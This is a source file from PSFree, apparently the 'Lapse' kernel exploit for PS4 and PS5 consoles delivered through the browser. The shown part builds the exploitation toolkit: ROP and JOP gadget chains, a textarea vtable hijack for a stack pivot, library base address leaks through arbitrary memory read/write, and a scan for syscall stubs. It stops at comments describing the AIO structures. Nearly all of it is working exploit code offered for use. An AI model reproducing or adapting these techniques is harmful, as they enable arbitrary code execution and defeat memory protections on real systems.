/* Copyright (C) 2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20). It
// takes advantage of a bug in aio_multi_delete(). Take a look at the comment
// at the race_one() function here for a brief summary.

// debug comment legend:
// * PANIC - code will make the system vulnerable to a kernel panic or it will
//   perform a operation that might panic
// * RESTORE - code will repair kernel panic vulnerability
// * MEMLEAK - memory leaks that our code will induce

// sys/socket.h
const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;
// netinet/in.h
const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
// netinet/tcp.h
const TCP_INFO = 0x20;
const size_tcp_info = 0xec;
// netinet/tcp_fsm.h
const TCPS_ESTABLISHED = 4;
// netinet6/in6.h
const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;
// sys/cpuset.h
const CPU_LEVEL_WHICH = 3;
const CPU_WHICH_TID = 1;
const sizeof_cpuset_t_ = 16;
// sys/mman.h
const MAP_SHARED = 1;
const MAP_FIXED = 0x10;
const MAP_ANON = 0x1000;
const MAP_PREFAULT_READ = 0x00040000;
// sys/rtprio.h
const RTP_LOOKUP = 0;
const RTP_SET = 1;
const RTP_PRIO_ITHD = 1;
const RTP_PRIO_REALTIME = 2;
const RTP_PRIO_NORMAL = 3;
const RTP_PRIO_IDLE = 4;
//
const PROT_READ = 0x01;
const PROT_WRITE = 0x02;
const PROT_EXEC = 0x04;
// SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
// has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
// group. queue 0 of each group is currently unused. queue 1 has the lowest
// priority and queue 3 has the highest
//
// the SceFsstAIO workers will process entries at the main queues. they will
// refill the main queues from the corresponding wait queues each time they
// dequeue a request (e.g. fill the  low priority main queue from the low
// priority wait queue)
//
// entries on the wait queue will always have a 0 ticket number. they will
// get assigned a nonzero ticket number once they get put on the main queue
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const num_workers = 2;
// max number of requests that can be created/polled/canceled/deleted/waited
const max_aio_ids = 0x80;
// CONFIG CONSTANTS
const main_core = 7;
const num_grooms = 0x200;
const num_handles = 0x100;
const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
const num_alias = 100;
const num_races = 100;
const leak_len = 16;
const num_clobbers = 8;
var off_kstr;
var off_cpuid_to_pcpu;
var off_sysent_661;
var jmp_rsi;
//var patch_elf_loc;
var pthread_offsets;
var syscall_array;
var libwebkit_base;
var libkernel_base;
var libc_base;
var webkit_gadget_offsets;
var libc_gadget_offsets;
var libkernel_gadget_offsets;
var gadgets;
var off_ta_vt;
var off_wk_stack_chk_fail;
var off_scf;
var off_wk_strlen;
var off_strlen;
var Chain;
var chain;
var nogc;
// put the sycall names that you want to use here
var syscall_map;
// highest priority we can achieve given our credentials
// Initialize rtprio lazily to avoid TDZ issues
var rtprio = null;
// the various SceAIO syscalls that copies out errors/states will not check if
// the address is NULL and will return EFAULT. this dummy buffer will serve as
// the default argument so users don't need to specify one
var _aio_errors = null;
// Initialize _aio_errors_p lazily to avoid TDZ issues with mem
var _aio_errors_p = null;

// ROP chain manager base class
// Args:
//   stack_size: the size of the stack
//   upper_pad: the amount of extra space above stack
class ChainBase {
  constructor(stack_size=0x1000, upper_pad=0x10000) {
    this._is_dirty = false;
    this.position = 0;
    const return_value = new Uint32Array(4);
    this._return_value = return_value;
    this.retval_addr = get_view_vector(return_value);
    const errno = new Uint32Array(1);
    this._errno = errno;
    this.errno_addr = get_view_vector(errno);
    const full_stack_size = upper_pad + stack_size;
    const stack_buffer = new ArrayBuffer(full_stack_size);
    const stack = new DataView(stack_buffer, upper_pad);
    this.stack = stack;
    this.stack_addr = get_view_vector(stack);
    this.stack_size = stack_size;
    this.full_stack_size = full_stack_size;
  }
  // use this if you want to write a new ROP chain but don't want to allocate
  // a new instance
  empty() {
    this.position = 0;
  }
  // flag indicating whether .run() was ever called with this chain
  get is_dirty() {
    return this._is_dirty;
  }
  clean() {
    this._is_dirty = false;
  }
  dirty() {
    this._is_dirty = true;
  }
  check_allow_run() {
    if (this.position === 0) {
      throw Error('chain is empty');
    }
    if (this.is_dirty) {
      throw Error('chain already ran, clean it first');
    }
  }
  reset() {
    this.empty();
    this.clean();
  }
  get retval_int() {
    return this._return_value[0] | 0;
  }
  get retval() {
    return new Int(this._return_value[0], this._return_value[1]);
  }
  // return value as a pointer
  get retval_ptr() {
    return new Addr(this._return_value[0], this._return_value[1]);
  }
  set retval(value) {
    const values = lohi_from_one(value);
    const retval = this._return_value;
    retval[0] = values[0];
    retval[1] = values[1];
  }
  get retval_all() {
    const retval = this._return_value;
    return [new Int(retval[0], retval[1]), new Int(retval[2], retval[3])];
  }
  set retval_all(values) {
    const [a, b] = [lohi_from_one(values[0]), lohi_from_one(values[1])];
    const retval = this._return_value;
    retval[0] = a[0];
    retval[1] = a[1];
    retval[2] = b[0];
    retval[3] = b[1];
  }
  get errno() {
    return this._errno[0];
  }
  set errno(value) {
    this._errno[0] = value;
  }
  push_value(value) {
    const position = this.position;
    if (position >= this.stack_size) {
      throw Error(`no more space on the stack, pushed value: ${value}`);
    }
    const values = lohi_from_one(value);
    const stack = this.stack;
    stack.setUint32(position, values[0], true);
    stack.setUint32(position + 4, values[1], true);
    this.position += 8;
  }
  get_gadget(insn_str) {
    const addr = this.gadgets.get(insn_str);
    if (addr === undefined) {
      throw Error(`gadget not found: ${insn_str}`);
    }
    return addr;
  }
  push_gadget(insn_str) {
    this.push_value(this.get_gadget(insn_str));
  }
  push_call(func_addr, ...args) {
    const argument_pops = [
      'pop rdi; ret',
      'pop rsi; ret',
      'pop rdx; ret',
      'pop rcx; ret',
      'pop r8; ret',
      'pop r9; ret'
    ];
    if (args.length > 6) {
      throw TypeError('push_call() does not support functions that have more than 6 arguments');
    }
    for (var i = 0; i < args.length; i++) {
      this.push_gadget(argument_pops[i]);
      this.push_value(args[i]);
    }
    // The address of our buffer seems to be always aligned to 8 bytes.
    // SysV calling convention requires the stack is aligned to 16 bytes on
    // function entry, so push an additional 8 bytes to pad the stack. We
    // pushed a "ret" gadget for a noop.
    if ((this.position & (0x10 - 1)) !== 0) {
      this.push_gadget('ret');
    }
    if (typeof func_addr === 'string') {
      this.push_gadget(func_addr);
    } else {
      this.push_value(func_addr);
    }
  }
  push_syscall(syscall_name, ...args) {
    if (typeof syscall_name !== 'string') {
      throw TypeError(`syscall_name not a string: ${syscall_name}`);
    }
    const sysno = syscall_map.get(syscall_name);
    if (sysno === undefined) {
      throw Error(`syscall_name not found: ${syscall_name}`);
    }
    const syscall_addr = this.syscall_array[sysno];
    if (syscall_addr === undefined) {
      throw Error(`syscall number not in syscall_array: ${sysno}`);
    }
    this.push_call(syscall_addr, ...args);
  }
  // Sets needed class properties
  // Args:
  //   gadgets:
  //     A Map-like object mapping instruction strings (e.g. "pop rax; ret")
  //     to their addresses in memory.
  //   syscall_array:
  //     An array whose indices correspond to syscall numbers. Maps syscall
  //     numbers to their addresses in memory. Defaults to an empty Array.
  static init_class(gadgets, syscall_array=[]) {
    this.prototype.gadgets = gadgets;
    this.prototype.syscall_array = syscall_array;
  }
  // START: implementation-dependent parts
  // the user doesn't need to implement all of these. just the ones they need
  // Firmware specific method to launch a ROP chain
  // Proper implementations will check if .position is nonzero before
  // running. Implementations can optionally check .is_dirty to enforce
  // single-run gadget sequences
  run() {
    throw Error('not implemented');
  }
  // anything you need to do before the ROP chain jumps back to JavaScript
  push_end() {
    throw Error('not implemented');
  }
  push_get_errno() {
    throw Error('not implemented');
  }
  push_clear_errno() {
    throw Error('not implemented');
  }
  // get the rax register
  push_get_retval() {
    throw Error('not implemented');
  }
  // get the rax and rdx registers
  push_get_retval_all() {
    throw Error('not implemented');
  }
  // END: implementation-dependent parts
  // note that later firmwares (starting around > 5.00?), the browser doesn't
  // have a JIT compiler. we programmed in a way that tries to make the
  // resulting bytecode be optimal
  // we intentionally have an incomplete set (there's no function to get a
  // full 128-bit result). we only implemented what we think are the common
  // cases. the user will have to implement those other functions if they
  // need it
  do_call(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_call(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  call_void(...args) {
    this.do_call(...args);
  }
  call_int(...args) {
    this.do_call(...args);
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  call(...args) {
    this.do_call(...args);
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  do_syscall(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_syscall(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  syscall_void(...args) {
    this.do_syscall(...args);
  }
  syscall_int(...args) {
    this.do_syscall(...args);
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  syscall(...args) {
    this.do_syscall(...args);
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  syscall_ptr(...args) {
    this.do_syscall(...args);
    const retval = this._return_value;
    return new Addr(retval[0], retval[1]);
  }
  // syscall variants that throw an error on errno
  do_syscall_clear_errno(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_clear_errno();
      this.push_syscall(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  sysi(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  sys(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  sysp(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    const retval = this._return_value;
    return new Addr(retval[0], retval[1]);
  }
}

function get_gadget(map, insn_str) {
  const addr = map.get(insn_str);
  if (addr === undefined) {
    throw Error(`gadget not found: ${insn_str}`);
  }
  return addr;
}

// Chain implementation based on Chain803. Replaced offsets that changed
// between versions. Replaced gadgets that were missing with new ones that
// won't change the API.
// gadgets for the JOP chain
// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
// because jop1-5 was the original chain used by the old implementation of
// Chain803. Now the sequence is jop1-3 then to jop2-5.
// When the scrollLeft getter native function is called on PS4 9.00, rsi is the
// JS wrapper for the WebCore textarea class.
const jop1 = `
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`;
// Since the method of code redirection we used is via redirecting a call to
// jump to our JOP chain, we have the return address of the caller on entry.
// jop1 pushed another object (via the call instruction) but we want no
// extra objects between the return address and the rbp that will be pushed by
// jop2 later. So we pop the return address pushed by jop1.
// This will make pivoting back easy, just "leave; ret".
const jop2 = `
pop rsi
jmp qword ptr [rax + 0x1c]
`;
const jop3 = `
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x30]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be ignored
const jop4 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x58]
`;
const jop5 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop6 = `
push rdx
jmp qword ptr [rax]
`;
const jop7 = 'pop rsp; ret';
// the ps4 firmware is compiled to use rbp as a frame pointer
// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp
const jop8 = `
mov rdi, qword ptr [rsi + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x70]
`;
const jop9 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop10 = `
mov rdx, qword ptr [rdx + 0x50]
mov ecx, 0xa
call qword ptr [rax + 0x40]
`;
const jop11 = `
pop rsi
cmc
jmp qword ptr [rax + 0x7c]
`;

function resolve_import(import_addr) {
  if (import_addr.read16(0) !== 0x25ff) {
    throw Error(
      `instruction at ${import_addr} is not of the form: jmp qword`
      + ' [rip + X]');
  }
  // module_function_import:
  //     jmp qword [rip + X]
  //     ff 25 xx xx xx xx // signed 32-bit displacement
  const disp = import_addr.read32(2);
  // assume disp and offset are 32-bit integers
  // x | 0 will always be a signed integer
  const offset = (disp | 0) + 6;
  // The rIP value used by "jmp [rip + X]" instructions is actually the rIP
  // of the next instruction. This means that the actual address used is
  // [rip + X + sizeof(jmp_insn)], where sizeof(jmp_insn) is the size of the
  // jump instruction, which is 6 in this case.
  const function_addr = import_addr.readp(offset);
  return function_addr;
}

function get_bases() {
  if (mem === null) {
    throw Error('mem is not initialized. make_arw() must be called first to initialize mem.');
  }
  const off_jsta_impl = 0x18;
  const textarea = document.createElement('textarea');
  const webcore_textarea = mem.addrof(textarea).readp(off_jsta_impl);
  const textarea_vtable = webcore_textarea.readp(0);
  // Debugging log; find offset off_ta_vt
  //log("off_ta_vt: " + (textarea_vtable - find_base(textarea_vtable, true, true)));
  //throw Error('Operation cancelled!');
  libwebkit_base = textarea_vtable.sub(off_ta_vt);
  const stack_chk_fail_import = libwebkit_base.add(off_wk_stack_chk_fail);
  const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
  // Debugging log; find offset off_scf
  //log("off_scf: " + (stack_chk_fail_addr - find_base(stack_chk_fail_addr, true, true)));
  //throw Error('Operation cancelled!');
  libkernel_base = stack_chk_fail_addr.sub(off_scf);
  const strlen_import = libwebkit_base.add(off_wk_strlen);
  const strlen_addr = resolve_import(strlen_import);
  // Debugging log; find offset off_strlen
  //log("off_strlen: " + (strlen_addr - find_base(strlen_addr, true, true)));
  //throw Error('Operation cancelled!');
  libc_base = strlen_addr.sub(off_strlen);
}

function init_gadget_map(gadget_map, offset_map, base_addr) {
  for (const [insn, offset] of offset_map) {
    gadget_map.set(insn, base_addr.add(offset));
  }
}

class Chain900Base extends ChainBase {
  push_end() {
    this.push_gadget('leave; ret');
  }
  push_get_retval() {
    this.push_gadget('pop rdi; ret');
    this.push_value(this.retval_addr);
    this.push_gadget('mov qword ptr [rdi], rax; ret');
  }
  push_get_errno() {
    this.push_gadget('pop rdi; ret');
    this.push_value(this.errno_addr);
    this.push_call(this.get_gadget('__error'));
    this.push_gadget('mov rax, qword ptr [rax]; ret');
    this.push_gadget('mov dword ptr [rdi], eax; ret');
  }
  push_clear_errno() {
    this.push_call(this.get_gadget('__error'));
    this.push_gadget('pop rsi; ret');
    this.push_value(0);
    this.push_gadget('mov dword ptr [rax], esi; ret');
  }
}
class Chain700_852 extends Chain900Base {
  constructor() {
    super();
    const [rdx, rdx_bak] = mem.gc_alloc(0x58);
    const off_js_cell = 0;
    rdx.write64(off_js_cell, this._empty_cell);
    rdx.write64(0x50, this.stack_addr);
    this._rsp = mem.fakeobj(rdx);
  }
  run() {
    this.check_allow_run();
    this._rop.launch = this._rsp;
    this.dirty();
  }
}
class Chain900_960 extends Chain900Base {
  constructor() {
    super();
    // Create a DOM object (textarea) which is used as the exploit pivot source.
    var textarea = document.createElement('textarea');
    this._textarea = textarea;
    // Get the JS and WebCore pointers associated with the textarea element.
    var js_ta = mem.addrof(textarea);
    var webcore_ta = js_ta.readp(0x18);
    this._webcore_ta = webcore_ta;
    // Allocate a fake vtable.
    // - Uint8Array is lightweight and fast.
    // - 0x200 bytes is enough for all required gadget offsets.
    // - A reference is stored to prevent garbage collection.
    var vtable = new Uint8Array(0x200);
    var old_vtable_p = webcore_ta.readp(0);
    this._vtable = vtable; // Prevent GC
    this._old_vtable_p = old_vtable_p; // Used for possible restore
    // Write needed JOP entry gadgets into the fake vtable.
    rw_write64(vtable, 0x1b8, this.get_gadget(jop1));
    if ((config_target >= 0x900) && (config_target < 0x950)) {
      rw_write64(vtable, 0xb8, this.get_gadget(jop2));
      rw_write64(vtable, 0x1c, this.get_gadget(jop3));
    } else {
      rw_write64(vtable, 0xb8, this.get_gadget(jop11));
      rw_write64(vtable, 0x7c, this.get_gadget(jop3));
    }
    // Allocate rax_ptrs, which serves as the JOP pointer table.
    // - This buffer must be referenced on the class instance to avoid GC.
    var rax_ptrs = new Uint8Array(0x100);
    var rax_ptrs_p = get_view_vector(rax_ptrs);
    this._rax_ptrs = rax_ptrs; // Prevent GC
    rw_write64(rax_ptrs, 0x30, this.get_gadget(jop4));
    rw_write64(rax_ptrs, 0x58, this.get_gadget(jop5));
    rw_write64(rax_ptrs, 0x10, this.get_gadget(jop6));
    rw_write64(rax_ptrs, 0x00, this.get_gadget(jop7));
    // Stack pivot target
    rw_write64(this._rax_ptrs, 0x18, this.stack_addr);
    // Allocate jop_buffer which holds a pointer to rax_ptrs.
    // - Must also be preserved to prevent garbage collection.
    var jop_buffer = new Uint8Array(8);
    var jop_buffer_p = get_view_vector(jop_buffer);
    this._jop_buffer = jop_buffer; // Prevent GC
    rw_write64(jop_buffer, 0, rax_ptrs_p);
    // Link jop_buffer into the fake vtable.
    // - This is the actual JOP entry point used by WebKit.
    rw_write64(vtable, 8, jop_buffer_p);
  }
  run() {
    this.check_allow_run();
    // change vtable
    this._webcore_ta.write64(0, get_view_vector(this._vtable));
    // jump to JOP chain
    this._textarea.scrollLeft;
    // restore vtable
    this._webcore_ta.write64(0, this._old_vtable_p);
    this.dirty();
  }
}

// creates an ArrayBuffer whose contents is copied from addr
function make_buffer(addr, size) {
  // see enum TypedArrayMode from
  // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
  // at webkitgtk 2.34.4
  //
  // see possiblySharedBuffer() from
  // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
  // at webkitgtk 2.34.4

  // We will create an OversizeTypedArray via requesting an Uint8Array whose
  // number of elements will be greater than fastSizeLimit (1000).
  //
  // We will not use a FastTypedArray since its m_vector is visited by the
  // GC and we will temporarily change it. The GC expects addresses from the
  // JS heap, and that heap has metadata that the GC uses. The GC will likely
  // crash since valid metadata won't likely be found at arbitrary addresses.
  //
  // The FastTypedArray approach will have a small time frame where the GC
  // can inspect the invalid m_vector field.
  //
  // Views created via "new TypedArray(x)" where "x" is a number will always
  // have an m_mode < WastefulTypedArray.
  const u = new Uint8Array(1001);
  const u_addr = mem.addrof(u);
  // we won't change the butterfly and m_mode so we won't save those
  const old_addr = u_addr.read64(off_view_m_vector);
  const old_size = u_addr.read32(off_view_m_length);
  u_addr.write64(off_view_m_vector, addr);
  u_addr.write32(off_view_m_length, size);
  const copy = new Uint8Array(u.length);
  copy.set(u);
  // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
  // associated with them, if we ask for view.buffer, the view will be
  // converted into a WastefulTypedArray and an ArrayBuffer will be created.
  // This is done by calling slowDownAndWasteMemory().
  //
  // We can't use slowDownAndWasteMemory() on u since that will create a
  // JSC::ArrayBufferContents with its m_data pointing to addr. On the
  // ArrayBuffer's death, it will call WTF::fastFree() on m_data. This can
  // cause a crash if the m_data is not from the fastMalloc heap, and even if
  // it is, freeing abitrary addresses is dangerous as it may lead to a
  // use-after-free.
  const res = copy.buffer;
  // restore
  u_addr.write64(off_view_m_vector, old_addr);
  u_addr.write32(off_view_m_length, old_size);
  return res;
}

function init_syscall_array(
  syscall_array,
  libkernel_web_base,
  max_search_size
) {
  if ((typeof max_search_size !== 'number') || !isFinite(max_search_size) || (Math.floor(max_search_size) !== max_search_size)) {
    throw TypeError(
      `max_search_size is not a integer: ${max_search_size}`);
  }
  if (max_search_size < 0) {
    throw Error(`max_search_size is less than 0: ${max_search_size}`);
  }
  const libkernel_web_buffer = make_buffer(
    libkernel_web_base,
    max_search_size
  );
  const kbuf = new BufferView(libkernel_web_buffer);
  // Search 'rdlo' string from libkernel_web's .rodata section to gain an
  // upper bound on the size of the .text section.
  var text_size = 0;
  var found = false;
  for (var i = 0; i < max_search_size; i++) {
    if (kbuf[i] === 0x72
      && kbuf[i + 1] === 0x64
      && kbuf[i + 2] === 0x6c
      && kbuf[i + 3] === 0x6f
    ) {
      text_size = i;
      found = true;
      break;
    }
  }
  if (!found) {
    throw Error(
      '"rdlo" string not found in libkernel_web, base address:'
      + ` ${libkernel_web_base}`);
  }
  // search for the instruction sequence:
  // syscall_X:
  //     mov rax, X
  //     mov r10, rcx
  //     syscall
  for (var i = 0; i < text_size; i++) {
    if (kbuf[i] === 0x48
      && kbuf[i + 1] === 0xc7
      && kbuf[i + 2] === 0xc0
      && kbuf[i + 7] === 0x49
      && kbuf[i + 8] === 0x89
      && kbuf[i + 9] === 0xca
      && kbuf[i + 10] === 0x0f
      && kbuf[i + 11] === 0x05
    ) {
      const syscall_num = kbuf.read32(i + 3);
      syscall_array[syscall_num] = libkernel_web_base.add(i);
      // skip the sequence
      i += 11;
    }
  }
}

function rop_init() {
  get_bases();
  init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
  init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
  init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
  init_syscall_array(syscall_array, libkernel_base, 300 * KB);
  if ((config_target >= 0x700) && (config_target < 0x900)) {
    var gs = Object.getOwnPropertyDescriptor(window, "location").set;
    // JSCustomGetterSetter.m_getterSetter
    gs = mem.addrof(gs).readp(0x28);
    // sizeof JSC::CustomGetterSetter
    const size_cgs = 0x18;
    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
    mem.cpy(gc_buf, gs, size_cgs);
    // JSC::CustomGetterSetter.m_setter
    gc_buf.write64(0x10, get_gadget(gadgets, jop8));
    const proto = Chain.prototype;
    // _rop must have a descriptor initially in order for the structure to pass
    // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
    // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
    // checks for any descriptor to run
    //
    // the butterfly's indexing type must be something the GC won't inspect
    // like DoubleShape. it will be used to store the JOP table's pointer
    const _rop = {
      get launch() {
        throw Error("never call");
      },
      0: 1.1,
    };
    // replace .launch with the actual custom getter/setter
    mem.addrof(_rop).write64(off_js_inline_prop, gc_buf);
    proto._rop = _rop;
    // JOP table
    var rax_ptrs = new Uint8Array(0x100);
    var rax_ptrs_p = get_view_vector(rax_ptrs);
    this._rax_ptrs = rax_ptrs; // Prevent GC
    proto._rax_ptrs = rax_ptrs;
    rw_write64(rax_ptrs, 0x70, get_gadget(gadgets, jop9));
    rw_write64(rax_ptrs, 0x30, get_gadget(gadgets, jop10));
    rw_write64(rax_ptrs, 0x40, get_gadget(gadgets, jop6));
    rw_write64(rax_ptrs, 0x00, get_gadget(gadgets, jop7));
    const jop_buffer_p = mem.addrof(_rop).readp(off_js_butterfly);
    jop_buffer_p.write64(0, rax_ptrs_p);
    const empty = {};
    const off_js_cell = 0;
    proto._empty_cell = mem.addrof(empty).read64(off_js_cell);
  }
  //log('syscall_array:');
  //log(syscall_array);
  Chain.init_class(gadgets, syscall_array);
}

function ViewMixin(superclass) {
  const res = class extends superclass {
    constructor(...args) {
      super(...args);
      this.buffer;
    }
    get addr() {
      var res = this._addr_cache;
      if (res !== undefined) {
        return res;
      }
      res = get_view_vector(this);
      this._addr_cache = res;
      return res;
    }
    get size() {
      return this.byteLength;
    }
    addr_at(index) {
      const size = this.BYTES_PER_ELEMENT;
      return this.addr.add(index * size);
    }
    sget(index) {
      return this[index] | 0;
    }
  };
  // workaround for known affected versions: ps4 [6.00, 10.00)
  // see from() and of() from
  // WebKit/Source/JavaScriptCore/builtins/TypedArrayConstructor.js at PS4
  // 8.0x
  // @getByIdDirectPrivate(this, "allocateTypedArray") will fail when "this"
  // isn't one of the built-in TypedArrays. this is a violation of the
  // ECMAScript spec at that time
  // TODO assumes ps4, support ps5 as well
  // FIXME define the from/of workaround functions once
  res.from = function from(...args) {
    const base = this.__proto__;
    return new this(base.from(...args).buffer);
  };
  res.of = function of(...args) {
    const base = this.__proto__;
    return new this(base.of(...args).buffer);
  };
  return res;
}
class View1 extends ViewMixin(Uint8Array) {}
class View2 extends ViewMixin(Uint16Array) {}
class View4 extends ViewMixin(Uint32Array) {}
class Buffer extends BufferView {
  get addr() {
    var res = this._addr_cache;
    if (res !== undefined) {
      return res;
    }
    res = get_view_vector(this);
    this._addr_cache = res;
    return res;
  }
  get size() {
    return this.byteLength;
  }
  addr_at(index) {
    return this.addr.add(index);
  }
}
// see from() and of() comment above
Buffer.from = function from(...args) {
  const base = this.__proto__;
  return new this(base.from(...args).buffer);
};
Buffer.of = function of(...args) {
  const base = this.__proto__;
  return new this(base.of(...args).buffer);
};
const VariableMixin = superclass => class extends superclass {
  constructor(value=0) {
    // unlike the View classes, we don't allow number coercion. we
    // explicitly allow floats unlike Int
    if (typeof value !== 'number') {
      throw TypeError('value not a number');
    }
    super([value]);
  }
  addr_at(...args) {
    throw TypeError('unimplemented method');
  }
  [Symbol.toPrimitive](hint) {
    return this[0];
  }
  toString(...args) {
    return this[0].toString(...args);
  }
};
class Word extends VariableMixin(View4) {}
// mutable Int (we are explicitly using Int's private fields)
const Word64Mixin = superclass => class extends superclass {
  constructor(...args) {
    if (!args.length) {
      return super(0);
    }
    super(...args);
  }
  get addr() {
    // assume this is safe to cache
    return get_view_vector(this._u32);
  }
  get length() {
    return 1;
  }
  get size() {
    return 8;
  }
  get byteLength() {
    return 8;
  }
  // no setters for top and bot since low/high can accept negative integers
  get lo() {
    return super.lo;
  }
  set lo(value) {
    this._u32[0] = value;
  }
  get hi() {
    return super.hi;
  }
  set hi(value) {
    this._u32[1] = value;
  }
  set(value) {
    const buffer = this._u32;
    const values = lohi_from_one(value);
    buffer[0] = values[0];
    buffer[1] = values[1];
  }
};
class Long extends Word64Mixin(Int) {
  as_addr() {
    return new Addr(this);
  }
}
class Pointer extends Word64Mixin(Addr) {}
// create a char array like in the C language
// string to view since it's easier to get the address of the buffer this way
function cstr(str) {
  str += '\0';
  return View1.from(str, c => c.codePointAt(0));
}
// make a JavaScript string
function jstr(buffer) {
  var res = '';
  for (const item of buffer) {
    if (item === 0) {
      break;
    }
    res += String.fromCodePoint(item);
  }
  // convert to primitive string
  return String(res);
}

function get_rtprio() {
  if (rtprio === null) {
    rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);
  }
  return rtprio;
}

function get_aio_errors_p() {
  if (_aio_errors === null) {
    _aio_errors = new View4(max_aio_ids);
  }
  if (_aio_errors_p === null) {
    _aio_errors_p = _aio_errors.addr;
  }
  return _aio_errors_p;
}
//================================================================================================
// LAPSE INIT FUNCTION ===========================================================================
//================================================================================================
async function lapse_init() {
  rop_init();
  chain = new Chain();
  init_gadget_map(gadgets, pthread_offsets, libkernel_base);
}

function sys_void(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  return chain.syscall_void(...args);
}

function sysi(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  return chain.sysi(...args);
}

function call_nze(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  const res = chain.call_int(...args);
  if (res !== 0) {
    die(`call(${args[0]}) returned nonzero: ${res}`);
  }
}
// #define SCE_KERNEL_AIO_STATE_NOTIFIED       0x10000
//
// #define SCE_KERNEL_AIO_STATE_SUBMITTED      1
// #define SCE_KERNEL_AIO_STATE_PROCESSING     2
// #define SCE_KERNEL_AIO_STATE_COMPLETED      3
// #define SCE_KERNEL_AIO_STATE_ABORTED        4
//
// typedef struct SceKernelAioResult {
//     // errno / SCE error code / number of bytes processed
//     int64_t returnValue;
//     // SCE_KERNEL_AIO_STATE_*
//     uint32_t state;
// } SceKernelAioResult;
//
// typedef struct SceKernelAioRWRequest {
//     off_t offset;
//     size_t nbyte;
//     void *buf;
//     struct SceKernelAioResult *result;
//     int fd;
// } SceKernelAioRWRequest;
//
// typedef int SceKernelAioSubmitId;
//
// // SceAIO submit commands
// #define SCE_KERNEL_AIO_CMD_READ     0x001
// #define SCE_KERNEL_AIO_CMD_WRITE    0x002
// #define SCE_KERNEL_AIO_CMD_MASK     0xfff
// // SceAIO submit command flags
// #define SCE_KERNEL_AIO_CMD_MULTI 0x1000
//
// #define SCE_KERNEL_AIO_PRIORITY_LOW     1
// #define SCE_KERNEL_AIO_PRIORITY_MID     2
